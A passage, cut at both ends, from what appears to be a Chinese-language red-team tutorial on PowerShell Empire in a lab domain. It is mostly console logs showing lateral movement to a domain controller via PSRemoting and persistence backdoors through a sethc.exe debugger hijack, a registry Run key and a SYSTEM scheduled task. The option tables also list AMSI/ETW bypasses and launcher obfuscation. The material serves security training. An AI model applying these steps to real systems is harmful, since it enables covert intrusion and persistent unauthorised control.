</span></span><span class="line"><span class="cl">HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; usemodule powershell/lateral_movement/invoke_psremoting
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 7VLBMT3A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                            
</span></span><span class="line"><span class="cl"> Background   True                                                
</span></span><span class="line"><span class="cl"> Description  Executes a stager on remote hosts using PSRemoting. 
</span></span><span class="line"><span class="cl"> Language     powershell                                          
</span></span><span class="line"><span class="cl"> Name         powershell/lateral_movement/invoke_psremoting       
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                               
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1028            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value              │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 7VLBMT3A           │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Command          │                    │ False    │ Custom <span class="nb">command</span> to execute on remote │
</span></span><span class="line"><span class="cl">│                  │                    │          │ hosts.                              │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ComputerName     │                    │ True     │ Host<span class="o">[</span>s<span class="o">]</span> to execute the stager on,   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ comma separated.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CredID           │                    │ False    │ CredID from the store to use.       │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │                    │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                    │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>        │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Password         │                    │ False    │ Password to use to execute command. │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default            │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default            │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserName         │                    │ False    │ <span class="o">[</span>domain<span class="se">\]</span>username to use to execute │
</span></span><span class="line"><span class="cl">│                  │                    │          │ command.                            │
</span></span><span class="line"><span class="cl">└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psremoting<span class="o">)</span> &gt; <span class="nb">set</span> ComputerName dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set ComputerName to dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psremoting<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_psremoting<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">6</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">6</span> results received
</span></span><span class="line"><span class="cl">Job started: SW2P75
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent KX4GRYNF checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to KX4GRYNF at 172.16.0.106
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>可以看到已经反弹成功，和WMI的模块反弹回来的权限一样的：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//18.png" alt="18"></p>
<h2 id="后门">后门</h2>
<p>后门就无需多说了，大家都比较熟悉了，就是不需要通过密码凭证进入和控制系统，一般我们会用劫持Shift、注册表、计划任务等方式进行放置后门。</p>
<h3 id="劫持shift后门">劫持Shift后门</h3>
<p>使用模块<code>invoke_wmi_debugger</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">7</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">7</span> results received
</span></span><span class="line"><span class="cl">HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; usemodule powershell/lateral_movement/invoke_wmi_debugger
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 7VLBMT3A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                             
</span></span><span class="line"><span class="cl"> Background   False                                                                
</span></span><span class="line"><span class="cl"> Description  Uses WMI to <span class="nb">set</span> the debugger <span class="k">for</span> a target binary on a remote machine 
</span></span><span class="line"><span class="cl">              to be cmd.exe or a stager.                                           
</span></span><span class="line"><span class="cl"> Language     powershell                                                           
</span></span><span class="line"><span class="cl"> Name         powershell/lateral_movement/invoke_wmi_debugger                      
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                
</span></span><span class="line"><span class="cl"> OpsecSafe    False                                                                
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1047                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value                               │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 7VLBMT3A                            │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Binary           │ C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe         │ False    │ Binary to <span class="nb">set</span> <span class="k">for</span> the debugger.     │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw                  │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Cleanup          │                                     │ False    │ Switch. Disable the debugger <span class="k">for</span>    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ the specified TargetBinary.         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ComputerName     │                                     │ True     │ Host<span class="o">[</span>s<span class="o">]</span> to execute the stager on,   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ comma separated.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CredID           │                                     │ False    │ CredID from the store to use.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │                                     │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False                               │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>                         │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Password         │                                     │ False    │ Password to use to execute command. │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ RegPath          │ HKLM:Software<span class="se">\M</span>icrosoft<span class="se">\N</span>etwork<span class="se">\d</span>eb │ False    │ Registry location to store the      │
</span></span><span class="line"><span class="cl">│                  │ ug                                  │          │ script code. Last element is the    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ key name.                           │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ TargetBinary     │ sethc.exe                           │ True     │ Target binary to <span class="nb">set</span> the debugger   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="k">for</span> <span class="o">(</span>sethc.exe, Utilman.exe,        │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ osk.exe, Narrator.exe, or           │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ Magnify.exe<span class="o">)</span>                        │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserName         │                                     │ False    │ <span class="o">[</span>domain<span class="se">\]</span>username to use to execute │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ command.                            │
</span></span><span class="line"><span class="cl">└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger<span class="o">)</span> &gt; <span class="nb">set</span> ComputerName dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set ComputerName to dc.hack.lab
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger<span class="o">)</span> &gt; <span class="nb">set</span> TargetBinary sethc.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set TargetBinary to sethc.exe
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked 7VLBMT3A to run Task <span class="m">8</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">8</span> results received
</span></span><span class="line"><span class="cl">Invoke-Wmi executed on <span class="s2">&#34;dc.hack.lab&#34;</span> to <span class="nb">set</span> the debugger <span class="k">for</span> sethc.exe to be a stager <span class="k">for</span> listener test.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent 1VF4A7GE checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to 1VF4A7GE at 172.16.0.106
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 7VLBMT3A<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>在dc服务器按几次Shift键，会弹出cmd黑框然后消失，这边Empire就上线了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//19.png" alt="19"></p>
<p>可以看到上线的是system权限：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//20.png" alt="20"></p>
<h3 id="注册表注入后门">注册表注入后门</h3>
<p>我们使用的模块是<code>powershell/persistence/userland/registry</code>,执行后会在用户登录的时候启动一个命令：</p>
<p>需要设置一下</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Empire: KV9PG5FS<span class="o">)</span> &gt; whoami
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked KV9PG5FS to run Task <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">1</span> results received
</span></span><span class="line"><span class="cl">HACK<span class="se">\t</span>estuser
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: KV9PG5FS<span class="o">)</span> &gt; usemodule powershell/persistence/userland/registry
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to KV9PG5FS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @mattifestation                                                        
</span></span><span class="line"><span class="cl">              @harmj0y                                                               
</span></span><span class="line"><span class="cl">              @enigma0x3                                                             
</span></span><span class="line"><span class="cl"> Background   False                                                                  
</span></span><span class="line"><span class="cl"> Comments     https://github.com/mattifestation/PowerSploit/blob/master/Persistence/ 
</span></span><span class="line"><span class="cl">              Persistence.psm1                                                       
</span></span><span class="line"><span class="cl"> Description  Persist a stager <span class="o">(</span>or script<span class="o">)</span> via the                                   
</span></span><span class="line"><span class="cl">              HKCU:SOFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un registry key. This  
</span></span><span class="line"><span class="cl">              has an easy detection/removal rating.                                  
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/persistence/userland/registry                               
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    False                                                                  
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1060                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value                               │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ADSPath          │                                     │ False    │ Alternate-data-stream location to   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ store the script code.              │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ KV9PG5FS                            │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw                  │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Cleanup          │                                     │ False    │ Switch. Cleanup the trigger and any │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ script from specified location.     │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ EventLogID       │                                     │ False    │ Store the script in the Application │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ event log under the specified       │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ EventID. The ID needs to be         │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ unique/rare!                        │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ExtFile          │                                     │ False    │ Use an external file <span class="k">for</span> the        │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ payload instead of a stager.        │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ KeyName          │ Updater                             │ True     │ Key name <span class="k">for</span> the run trigger.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │ <span class="nb">test</span>                                │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False                               │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>                         │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default                             │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ RegPath          │ HKCU:Software<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>ur │ False    │ Registry location to store the      │
</span></span><span class="line"><span class="cl">│                  │ rentVersion<span class="se">\R</span>un                     │          │ script code. Last element is the    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ key name.                           │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default                             │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/persistence/userland/registry<span class="o">)</span> &gt; <span class="nb">set</span> RegPath <span class="s2">&#34;HKCU:Software\Microsoft\Windows\CurrentVersion\Run&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/persistence/userland/registry<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked KV9PG5FS to run Task <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">Registry persistence established using listener <span class="nb">test</span> stored in HKCU:Software<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un.
</span></span></code></pre></div><p>当然，上是设置在当前用户的注册表，想要本地所以登录的用户都起效那就设置下面的路径：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</span></span></code></pre></div><p>执行完之后，我们注销用户，重新登录的时候就会在empire上线了。</p>
<h3 id="计划任务">计划任务</h3>
<p>这个可以得到system权限，还有另外一个模块是利用计划任务上线的，跟注册表差不多，下面这个模块是要在管理员权限下执行的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; interact 45WYG2ZB
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 45WYG2ZB<span class="o">)</span> &gt;
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: 45WYG2ZB<span class="o">)</span> &gt; usemodule powershell/persistence/elevated/schtasks
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to 45WYG2ZB
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @mattifestation                                                        
</span></span><span class="line"><span class="cl">              @harmj0y                                                               
</span></span><span class="line"><span class="cl"> Background   False                                                                  
</span></span><span class="line"><span class="cl"> Comments     https://github.com/mattifestation/PowerSploit/blob/master/Persistence/ 
</span></span><span class="line"><span class="cl">              Persistence.psm1                                                       
</span></span><span class="line"><span class="cl"> Description  Persist a stager <span class="o">(</span>or script<span class="o">)</span> using schtasks running as SYSTEM. This    
</span></span><span class="line"><span class="cl">              has a moderate detection/removal rating.                               
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/persistence/elevated/schtasks                               
</span></span><span class="line"><span class="cl"> NeedsAdmin   True                                                                   
</span></span><span class="line"><span class="cl"> OpsecSafe    False                                                                  
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0111                                 
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1053                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value                               │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ADSPath          │                                     │ False    │ Alternate-data-stream location to   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ store the script code.              │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ 45WYG2ZB                            │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw                  │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Cleanup          │                                     │ False    │ Switch. Cleanup the trigger and any │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ script from specified location.     │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ DailyTime        │ 14:26                               │ False    │ Daily <span class="nb">time</span> to trigger the script    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ <span class="o">(</span>HH:mm<span class="o">)</span>.                            │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ExtFile          │                                     │ False    │ Use an external file <span class="k">for</span> the        │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ payload instead of a stager.        │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ IdleTime         │                                     │ False    │ User idle <span class="nb">time</span> <span class="o">(</span>in minutes<span class="o">)</span> to      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ trigger script.                     │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │ <span class="nb">test</span>                                │ False    │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False                               │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>                         │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                                     │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
